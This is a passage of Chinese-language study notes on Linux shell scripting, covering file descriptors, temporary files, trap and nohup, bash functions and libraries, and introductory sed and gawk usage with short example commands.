会在脚本退出时自动关闭它们.</p><p>在脚本结束前手动关闭文件描述符, 需要将它重定向到特殊符号 <code>&amp;-</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">exec <span class="hljs-number">3</span>&gt;<span class="hljs-meta">&amp;-</span><br></code></pre></td></tr></table></figure><p>在关闭文件描述符后, 如果你随后在脚本中打开了同一个文件, shell 会用一个新文件来替换已有的文件, 意思就是其内容会被覆盖.</p><h2 id="15-5-列出打开的文件描述符"><a href="#15-5-列出打开的文件描述符" class="headerlink" title="15.5 列出打开的文件描述符"></a>15.5 列出打开的文件描述符</h2><p>使用 <code>isof</code> 命令列出 Linux 系统打开的所有文件描述符.</p><h2 id="15-6-阻止命令输出"><a href="#15-6-阻止命令输出" class="headerlink" title="15.6 阻止命令输出"></a>15.6 阻止命令输出</h2><p>可以将 STDERR 的输出从定向到叫 null 文件的特殊文件.</p><p>shell 输出到 null 文件的任何数据都不会保存, 全部都会被丢弃.</p><p>在 Linux 系统上 null 文件的标准位置是 &#x2F;dev&#x2F;null.</p><p>也可以用 &#x2F;dev&#x2F;null 作为输入文件, 其能够快速清除现有文件中的数据.</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ cat <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> &gt; testfile<br></code></pre></td></tr></table></figure><h2 id="15-7-创建临时文件"><a href="#15-7-创建临时文件" class="headerlink" title="15.7 创建临时文件"></a>15.7 创建临时文件</h2><p>Linux 使用 &#x2F;tmp 目录来存放不需要用就保存的文件, 大多数 Linux 发行版配置了系统在启动时自动删除 &#x2F;tmp 目录的所有文件.</p><p><code>mktemp</code> 命令可以在 <code>/tmp</code> 目录中创建一个唯一的临时文件, shell 会创建这个文件, 但不用默认的 umask 值. 它会将文件的读和写权限分配给文件的属主, 并将你设成文件的属主.</p><h3 id="15-7-1-创建本地临时文件"><a href="#15-7-1-创建本地临时文件" class="headerlink" title="15.7.1 创建本地临时文件"></a>15.7.1 创建本地临时文件</h3><p>要用 mktemp 命令在本地目录中创建一个唯一文件, 需要指定一个文件名模板, 模板可以包含任意文本文件名, 在文件名末尾加上 6 个 X 就行了, mktemp 命令会用 6 个字符码替换这 6 个 X, 从而保证文件名在目录中唯一.</p><p>将文件名保存在变量中:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">tempfile=<span class="hljs-constructor">$(<span class="hljs-params">mktemp</span> <span class="hljs-params">test</span>.XXXXXX)</span><br></code></pre></td></tr></table></figure><h3 id="15-7-2-在-x2F-tmp-目录创建临时文件"><a href="#15-7-2-在-x2F-tmp-目录创建临时文件" class="headerlink" title="15.7.2 在 &#x2F;tmp 目录创建临时文件"></a>15.7.2 在 &#x2F;tmp 目录创建临时文件</h3><p>使用 <code>-t</code> 选项, 其会强制 mktemp 命令来到系统的临时目录来创建该文件, 在使用这个特性时, mktemp 命令会返回用来创建临时文件时的全路径.</p><h3 id="15-7-3-创建临时目录"><a href="#15-7-3-创建临时目录" class="headerlink" title="15.7.3 创建临时目录"></a>15.7.3 创建临时目录</h3><p><code>-d</code> 选项告诉 mktemp 创建一个临时目录.</p><h2 id="15-8-记录消息"><a href="#15-8-记录消息" class="headerlink" title="15.8 记录消息"></a>15.8 记录消息</h2><p>使用特殊的 tee 命令, 可以将输出同时发送到显示器和日志文件.</p><p>它会将从 STDIN 过来的数据同时发送到两处, 一处是 STDOUT, 一处是 tee 命令行所指定的文件:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">tee</span> filename<br></code></pre></td></tr></table></figure><p>可以配合管道符 <code>|</code>.</p><p>如果想将数据追加到文件, 必须使用 <code>-a</code> 选项.</p><h1 id="第16章-控制脚本"><a href="#第16章-控制脚本" class="headerlink" title="第16章 控制脚本"></a>第16章 控制脚本</h1><h2 id="16-1-处理信号"><a href="#16-1-处理信号" class="headerlink" title="16.1 处理信号"></a>16.1 处理信号</h2><h3 id="16-1-1-重温-Linux-信号"><a href="#16-1-1-重温-Linux-信号" class="headerlink" title="16.1.1 重温 Linux 信号"></a>16.1.1 重温 Linux 信号</h3><p>默认情况下, bash shell 会忽略收到的任何 SIGQUIT (3) 和 SIGTERM (15) 信号.</p><h3 id="16-1-2-生成信号"><a href="#16-1-2-生成信号" class="headerlink" title="16.1.2 生成信号"></a>16.1.2 生成信号</h3><h3 id="16-1-3-捕获信号"><a href="#16-1-3-捕获信号" class="headerlink" title="16.1.3 捕获信号"></a>16.1.3 捕获信号</h3><p>trap 命令允许你来指定 shell 及脚本要监看并从 shell 中拦截的 Linux 信号.</p><p>格式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">trap</span> commands signals<br></code></pre></td></tr></table></figure><p>使用 trap 命令来忽略信号如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;echo &#x27;Sorry! I have trapped Ctrl+C&#x27;&quot;</span> SIGINT<br></code></pre></td></tr></table></figure><p>trap 命令会在每次检测到 SIGINIT 信号时显示一行文本, 并捕获这个信号, 其会阻止用户用 bash shell 的组合键 Ctrl+C 来停止程序. </p><h3 id="16-1-4-捕获脚本退出"><a href="#16-1-4-捕获脚本退出" class="headerlink" title="16.1.4 捕获脚本退出"></a>16.1.4 捕获脚本退出</h3><p>要捕获脚本的退出 (也就是脚本退出这个行为), 在 trap 命令后加上 EXIT 信号:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-built_in">trap</span>  <span class="hljs-string">&quot;echo Goodbye...&quot;</span> EXIT<br></code></pre></td></tr></table></figure><p>在脚本退出时, 会打印 <code>Goodbye...</code></p><h3 id="16-1-5-修改或移除捕获"><a href="#16-1-5-修改或移除捕获" class="headerlink" title="16.1.5 修改或移除捕获"></a>16.1.5 修改或移除捕获</h3><p>在脚本的不同地方进行捕获, 就还是用 trap 命令, 只是后面的选项是新的, 这时脚本要捕获的信号就被修改了.</p><p>可以删除已设置好的捕获, 在 trap 命令与希望恢复默认行为的信号列表之间加上两个破折号 (单个也行).</p><p>如要恢复, 即不再对 SIGINT 进行捕获:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">trap <span class="hljs-comment">-- SIGINT</span><br></code></pre></td></tr></table></figure><h2 id="16-2-以后台模式运行脚本"><a href="#16-2-以后台模式运行脚本" class="headerlink" title="16.2 以后台模式运行脚本"></a>16.2 以后台模式运行脚本</h2><h3 id="16-2-1-后台运行脚本"><a href="#16-2-1-后台运行脚本" class="headerlink" title="16.2.1 后台运行脚本"></a>16.2.1 后台运行脚本</h3><p>在命令之后加上 <code>&amp;</code> 符号.</p><p>当后台进程运行时, 它仍然会使用终端显示器来显示 STDOUT 和 STDERR 消息.</p><p>最好是将后台运行的脚本的 STDOUT 和 STDERR 重定向.</p><h2 id="16-3-在非控制台下运行脚本"><a href="#16-3-在非控制台下运行脚本" class="headerlink" title="16.3 在非控制台下运行脚本"></a>16.3 在非控制台下运行脚本</h2><p>nohup 命令运行了另外一个命令来阻断所有发送给该进程的 SIGHUP 信号, 这会在退出终端会话时阻止进程退出.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">nohup</span> ./test.sh &amp;</span><br></code></pre></td></tr></table></figure><p>由于 nohup 命令会解除终端与进程的关联, 进程也就不再同 STDOUT 和 STDERR 联系在一起, 为了保存该命令产生的输出, nohup 命令会自动将 STDOUT 和 STDERR 的消息重定向到一个名为 nohuo.out 文件中.</p><h2 id="16-4-作业控制"><a href="#16-4-作业控制" class="headerlink" title="16.4 作业控制"></a>16.4 作业控制</h2><p>脚本用 $$ 变量来显示 Linux 系统分配给该脚本的 PID.</p><h2 id="16-6-定时控制脚本"><a href="#16-6-定时控制脚本" class="headerlink" title="16.6 定时控制脚本"></a>16.6 定时控制脚本</h2><p>在登录时运行的脚本应该放入 <code>$HOME/.bash_profile</code>.</p><p>每次启动一个新的 shell, bash shell 都会运行 <code>.bashrc</code> 文件.</p><p><code>.bashrc</code> 文件通常要执行两次, 一次是当你登入 bash shell, 另一次是当你启动一个 bash shell.</p><h1 id="第17章-创建函数"><a href="#第17章-创建函数" class="headerlink" title="第17章 创建函数"></a>第17章 创建函数</h1><h2 id="17-1-基本的脚本函数"><a href="#17-1-基本的脚本函数" class="headerlink" title="17.1 基本的脚本函数"></a>17.1 基本的脚本函数</h2><p><mark>函数</mark>是一个脚本代码块, 你可以为其命名并在代码中任何位置重用.</p><h3 id="17-1-1-创建函数"><a href="#17-1-1-创建函数" class="headerlink" title="17.1.1 创建函数"></a>17.1.1 创建函数</h3><p>有两种格式可以在 bash shell 脚本中创建函数:</p><p>第一种格式采用关键字 function:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span> &#123;<br>    commands<br>&#125;<br></code></pre></td></tr></table></figure><p>第二种格式:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">name</span><span class="hljs-params">()</span></span> &#123;<br>    commands<br>&#125;<br></code></pre></td></tr></table></figure><p>函数名后的空括号表明正在定义一个函数.</p><h3 id="17-1-2-使用函数"><a href="#17-1-2-使用函数" class="headerlink" title="17.1.2 使用函数"></a>17.1.2 使用函数</h3><p>指定函数名.</p><p>如果在函数被定以前使用函数, 会收到一条错误信息.</p><p>如果重定义了函数, 新定义会覆盖原来函数的定义, 且不会产生任何错误信息.</p><h2 id="17-2-返回值"><a href="#17-2-返回值" class="headerlink" title="17.2 返回值"></a>17.2 返回值</h2><p>bash shell 会把函数当作一个小型脚本, 运行结束时会返回一个退出状态码.</p><h3 id="17-2-1-默认退出状态码"><a href="#17-2-1-默认退出状态码" class="headerlink" title="17.2.1 默认退出状态码"></a>17.2.1 默认退出状态码</h3><p>默认情况下, 函数的退出状态码是函数中最后一条命令返回的推出状态码.</p><p>使用函数的默认退出状态码是很危险的.</p><h3 id="17-2-2-使用-return-命令"><a href="#17-2-2-使用-return-命令" class="headerlink" title="17.2.2 使用 return 命令"></a>17.2.2 使用 return 命令</h3><p>bash shell 用 return 命令来退出函数并返回特定的退出状态码.</p><p>两个注意事项:</p><ul><li>函数一结束就取返回值</li><li>退出状态码必须是 0 ~ 255</li></ul><p>如果在使用 <code>$?</code> 变量提取函数返回值之前执行了其他命令, 函数的返回值就会丢失.</p><p>如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><span class="hljs-keyword">function</span> db1 &#123;<br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Enter a value: &quot;</span> value<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;doubling the value&quot;</span><br>    <span class="hljs-built_in">return</span> $[ <span class="hljs-variable">$value</span> * 2 ]<br>&#125;<br><br>db1<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The new value is $?&quot;</span><br></code></pre></td></tr></table></figure><h3 id="17-2-3-使用函数输出"><a href="#17-2-3-使用函数输出" class="headerlink" title="17.2.3 使用函数输出"></a>17.2.3 使用函数输出</h3><p>获得函数的输出, 并保存在变量中:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">result</span>=<span class="hljs-string">`db1`</span><br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">result</span>=$(db1)<br></code></pre></td></tr></table></figure><p>获取输出, 和返回值不同.</p><h2 id="17-3-在函数中使用变量"><a href="#17-3-在函数中使用变量" class="headerlink" title="17.3 在函数中使用变量"></a>17.3 在函数中使用变量</h2><h3 id="17-3-1-向函数传递参数"><a href="#17-3-1-向函数传递参数" class="headerlink" title="17.3.1 向函数传递参数"></a>17.3.1 向函数传递参数</h3><p>同样还是用 <code>$#</code>, <code>$1</code> 这些特殊变量.</p><p>在脚本中指定函数时, 必须将参数和函数放在同一行:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">func1</span> <span class="hljs-variable">$value1</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>由于函数使用特殊参数环境变量作为自己的参数值, 因此它无法直接获取脚本在命令行中的参数值.</p><h3 id="17-3-2-在函数中处理变量"><a href="#17-3-2-在函数中处理变量" class="headerlink" title="17.3.2 在函数中处理变量"></a>17.3.2 在函数中处理变量</h3><p>函数中定义的变量与普通变量的作用域不同.</p><p>函数使用两种类型的变量:</p><ul><li>全局变量</li><li>局部变量</li></ul><h4 id="1-全局变量"><a href="#1-全局变量" class="headerlink" title="1. 全局变量"></a>1. 全局变量</h4><p>全局变量是在 shell 脚本中任何地方都有效的变量.</p><p>默认情况下, 在脚本中定义的任何变量都是全局变量, 在函数外定义的变量可在函数内正常访问.</p><h4 id="2-局部变量"><a href="#2-局部变量" class="headerlink" title="2. 局部变量"></a>2. 局部变量</h4><p>无需在函数中使用全局变量, 函数内部使用的任何变量都可以被声明成局部变量, 使用 local 关键词:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">local</span> <span class="hljs-keyword">temp</span><br></code></pre></td></tr></table></figure><p>也可在变量赋值语句中使用 local 关键字:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">local</span> temp=$[ $value + <span class="hljs-number">5</span> ]<br></code></pre></td></tr></table></figure><p>local 关键词保证了变量只局限在该函数中.</p><h2 id="17-4-数组变量和函数"><a href="#17-4-数组变量和函数" class="headerlink" title="17.4 数组变量和函数"></a>17.4 数组变量和函数</h2><h3 id="17-4-1-向函数传递数组参数"><a href="#17-4-1-向函数传递数组参数" class="headerlink" title="17.4.1 向函数传递数组参数"></a>17.4.1 向函数传递数组参数</h3><h3 id="17-4-2-从函数返回数组"><a href="#17-4-2-从函数返回数组" class="headerlink" title="17.4.2 从函数返回数组"></a>17.4.2 从函数返回数组</h3><h2 id="17-5-函数递归"><a href="#17-5-函数递归" class="headerlink" title="17.5 函数递归"></a>17.5 函数递归</h2><p>函数可以调用自己来得到结果.</p><h2 id="17-6-创建库"><a href="#17-6-创建库" class="headerlink" title="17.6 创建库"></a>17.6 创建库</h2><p>bash shell 允许创建函数库文件, 然后在多个脚本中引用该库文件.</p><p>第一步是创建一个包含脚本中所需函数的共用库文件.</p><p>如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># my script function</span><br><br><span class="hljs-keyword">function</span> addem &#123;<br>    <span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> + <span class="hljs-variable">$2</span> ]<br>&#125;<br></code></pre></td></tr></table></figure><p>第二步是在用这个函数的脚本中包含该库文件.</p><p>使用 source 命令, source 命令有个快捷的别名, 称做<mark>点操作符</mark> (dot operator):</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>./myfuncs<br></code></pre></td></tr></table></figure><p>等价于:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ./myfuncs<br></code></pre></td></tr></table></figure><h2 id="17-7-在命令行上使用函数"><a href="#17-7-在命令行上使用函数" class="headerlink" title="17.7 在命令行上使用函数"></a>17.7 在命令行上使用函数</h2><p>一旦在 shell 中定义了函数, 就可以在整个系统中使用, 无需担心脚本是不是在 PATH 环境变量里.</p><h3 id="17-7-1-在命令行上创建函数"><a href="#17-7-1-在命令行上创建函数" class="headerlink" title="17.7.1 在命令行上创建函数"></a>17.7.1 在命令行上创建函数</h3><p>单行方式定义函数:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">function</span> divem &#123; <span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> / <span class="hljs-variable">$2</span> ]; &#125;</span><br></code></pre></td></tr></table></figure><p>在命令行上定义函数时, 必须在每条命令之后加分号, 这样 shell 才知道在哪里是命令的起止.</p><p>多行方式定义:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-keyword">function</span> multem &#123;</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-built_in">echo</span> $[ <span class="hljs-variable">$1</span> * <span class="hljs-variable">$2</span> ]</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">&#125;</span><br></code></pre></td></tr></table></figure><p>在函数的尾部使用花括号, shell 就会知道你已经完成了函数的定义.</p><p>如果你起了一个和内建函数或另一个函数相同的名字, 函数将会覆盖原来的命令.</p><h3 id="17-7-2-在-bashrc-文件中定义函数"><a href="#17-7-2-在-bashrc-文件中定义函数" class="headerlink" title="17.7.2 在 .bashrc 文件中定义函数"></a>17.7.2 在 .bashrc 文件中定义函数</h3><p>在命令行上直接定义 shell 函数的明显缺点是退出 shell 时, 函数就消失了.</p><p>只要是在 shell 脚本中, 都可以用 source 命令来添加库文件.</p><h2 id="17-8-实例"><a href="#17-8-实例" class="headerlink" title="17.8 实例"></a>17.8 实例</h2><h3 id="17-8-1-下载及安装"><a href="#17-8-1-下载及安装" class="headerlink" title="17.8.1 下载及安装"></a>17.8.1 下载及安装</h3><h1 id="第18章-图形化桌面中的脚本编程"><a href="#第18章-图形化桌面中的脚本编程" class="headerlink" title="第18章 图形化桌面中的脚本编程"></a>第18章 图形化桌面中的脚本编程</h1><h2 id="18-1-创建文本菜单"><a href="#18-1-创建文本菜单" class="headerlink" title="18.1 创建文本菜单"></a>18.1 创建文本菜单</h2><p>创建交互式 shell 脚本最常用的方法是使用菜单.</p><p>通常菜单脚本会清空显示区域, 然后显示可用的选项列表.</p><p>shell 脚本菜单的核心是 case 命令.</p><h3 id="18-1-1-创建菜单布局"><a href="#18-1-1-创建菜单布局" class="headerlink" title="18.1.1 创建菜单布局"></a>18.1.1 创建菜单布局</h3><p>在创建菜单之前, 通常要先清空显示器上已有的内容, 这样就能在干净的环境中显示菜单.</p><p>在 echo 中使用非打印字符, 必须用 <code>-e</code> 选项:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">clear</span><br><span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;1.\tDisplay disk space&quot;</span><br></code></pre></td></tr></table></figure><p>创建菜单的最后一步是获取用户输入, 使用 read 命令.</p><h1 id="第19章-初识-sed-和-gawk"><a href="#第19章-初识-sed-和-gawk" class="headerlink" title="第19章 初识 sed 和 gawk"></a>第19章 初识 sed 和 gawk</h1><h2 id="19-1-文本处理"><a href="#19-1-文本处理" class="headerlink" title="19.1 文本处理"></a>19.1 文本处理</h2><h3 id="19-1-1-sed-编辑器"><a href="#19-1-1-sed-编辑器" class="headerlink" title="19.1.1 sed 编辑器"></a>19.1.1 sed 编辑器</h3><p>sed 编辑器被称作流编辑器 (stream editor), 和交互式编辑器 (如 vim) 恰好相反.</p><p>sed 编辑器的操作:</p><ol><li>一次从输入中读取一行数据</li><li>根据所提供的编辑器命令匹配数据</li><li>按照命令修改流中的数据</li><li>将新的数据输出到 STDOUT</li></ol><p>命令格式:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">sed options <span class="hljs-keyword">script</span> <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>可用选项:</p><ul><li><code>-e script</code>   在处理输入时，将 script 中指定的命令添加到已有的命令中</li><li><code>-f file</code>     在处理输入时，将 file 中指定的命令添加到已有的命令中</li><li><code>-n</code>          不产生命令输出，使用 print 命令来完成输出</li></ul><p>sed 编辑器并不会修改文本文件的数据，它只会将修改后的数据发送到 STDOUT.</p><p>替换命令, 如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a test&quot;</span> | sed <span class="hljs-string">&#x27;s/test/big test/&#x27;</span></span> <br></code></pre></td></tr></table></figure><h4 id="执行多个命令"><a href="#执行多个命令" class="headerlink" title="执行多个命令"></a>执行多个命令</h4><p>执行多个命令时使用 <code>-e</code> 选项:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sed -e <span class="hljs-string">&#x27;s/brown/green/; s/dog/cat/&#x27;</span> data.txt<br></code></pre></td></tr></table></figure><p>命令用分号 <code>;</code> 隔开，且必须位于命令末尾，不能有空格.</p><h4 id="多行命令"><a href="#多行命令" class="headerlink" title="多行命令"></a>多行命令</h4><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ sed -e &#x27;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/brown/green/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/fox/elephant/</span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">s/dog/cat/<span class="hljs-string">&#x27; data1.txt</span></span><br></code></pre></td></tr></table></figure><h4 id="从文件中获取命令"><a href="#从文件中获取命令" class="headerlink" title="从文件中获取命令"></a>从文件中获取命令</h4><p>每个命令占一行，可以给文件添加后缀 <code>.sed</code></p><h3 id="19-1-2-gawk-程序"><a href="#19-1-2-gawk-程序" class="headerlink" title="19.1.2 gawk 程序"></a>19.1.2 gawk 程序</h3><p>在所有的发行版中都没有默认安装 gawk 程序。</p><p>gawk 是原始 awk 的 GNU 版本。</p><p>gawk 提供了一种编程语言。</p><p>基本格式:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">gawk <span class="hljs-keyword">option</span> program <span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>可用选项:</p><ul><li><code>-F FS</code>, 指定行中划分数据字段的字段分隔符</li><li><code>-f file</code>, 从指定的文件中读取程序</li><li><code>-v var=value</code>, 定义 gawk 程序中的一个变量及其默认值</li><li><code>-mf N</code>, 指定要处理文件中的最大字段数</li><li><code>-mr N</code>, 指定数据文件中的最大数据行数</li><li><code>-W keyword</code>, 指定 gawk 中兼容模式或警告等级</li></ul><p>gawk 的脚本用一对花括号来定义，必须把脚本命令放在一对花括号中 <code>&#123;&#125;</code>.</p><p>gawk 命令行假定脚本是单个文本字符串, 因此还需要把脚本放到单引号中:</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ gawk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello World&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><p>gawk 会从 STDIN 等待输入数据。</p><p>gawk 会对数据中的每行文本执行程序.</p><p>使用 <code>Ctrl + D</code> 终止程序.</p><h4 id="使用数据字段变量"><a href="#使用数据字段变量" class="headerlink" title="使用数据字段变量"></a>使用数据字段变量</h4><p>gawk 会给一行中的每个数据元素分配一个变量, 默认为:</p><ul><li><code>$0</code>, 代表整个文本行</li><li><code>$1</code>, 代表文本行中的第1个数据字段</li><li><code>$2</code>, 代表文本行中的第2个数据字段</li><li><code>$n</code>, 代表文本行中的第n个数据字段<br>在文本行中，每个数据字段都是通过<mark>字段分隔符</mark>划分的。默认为任意的空白字符.</li></ul><h4 id="在程序脚本中使用多个命令"><a href="#在程序脚本中使用多个命令" class="headerlink" title="在程序脚本中使用多个命令"></a>在程序脚本中使用多个命令</h4><p>使用分号 <code>;</code> 分隔.</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">$ gawk <span class="hljs-string">&#x27;&#123;<span class="hljs-subst">$4</span>=&quot;Christine&quot;; print <span class="hljs-subst">$0</span>&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>一次一行:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">$ gawk &#x27;&#123;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">$<span class="hljs-number">4</span>=<span class="hljs-string">&quot;Christine</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">print $0&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure><h4 id="从文件中读取程序"><a href="#从文件中读取程序" class="headerlink" title="从文件中读取程序"></a>从文件中读取程序</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> gawk <span class="hljs-operator">-F</span>: <span class="hljs-operator">-f</span> script2.gawk /etc/passwd<br></code></pre></td></tr></table></figure><p>脚本文件中一条命令一行，不需要分号，但需要一对花括号.</p><h4 id="在读取数据前运行脚本"><a href="#在读取数据前运行脚本" class="headerlink" title="在读取数据前运行脚本"></a>在读取数据前运行脚本</h4><p>gawk 允许指定程序脚本何时运行。</p><p><code>BEGIN</code> 关键词，让程序在读取数据前运行脚本 </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">$ gawk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;print <span class="hljs-string">&quot;Hello World&quot;</span>&#125;&#x27;<br></code></pre></td></tr></table></figure><h4 id="在处理数据后运行脚本"><a href="#在处理数据后运行脚本" class="headerlink" title="在处理数据后运行脚本"></a>在处理数据后运行脚本</h4><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell">$ gawk &#x27;<span class="hljs-type">END</span> &#123;print <span class="hljs-string">&quot;End of File&quot;</span>&#125;&#x27; <span class="hljs-class"><span class="hljs-keyword">data</span>.txt</span><br></code></pre></td></tr></table></figure><h2 id="19-2-sed-编辑器基础"><a href="#19-2-sed-编辑器基础" class="headerlink" title="19.2 sed 编辑器基础"></a>19.2 sed 编辑器基础</h2><h3 id="19-2-1-更多的替换选项"><a href="#19-2-1-更多的替换选项" class="headerlink" title="19.2.1 更多的替换选项"></a>19.2.1 更多的替换选项</h3><h4 id="替换标记"><a href="#替换标记" class="headerlink" title="替换标记"></a>替换标记</h4><p>替换命令在替换多行文本时能够正常工作，但默认情况下它只替换每行中出现的第一处.</p><p>四种替换标签 (substitution flag):</p><ul><li>数字，表明新文本将替换地挤出模式匹配的地方</li><li>g, 表明新文本将会替换所有匹配的文本</li><li>p, 表明输出修改过的行, 通常和 <code>-n</code> 选项一起用</li><li>w file, 将替换结果写到文件中<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sed &#x27;s/<span class="hljs-keyword">test</span>/trial/w <span class="hljs-keyword">test</span>.txt&#x27; data.txt<br></code></pre></td></tr></table></figure>这里的 <code>test.txt</code> 是指定的用来保存的文件.</li></ul><h4 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h4><p>sed 允许选择其他字符作为替换命令中的分隔符:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 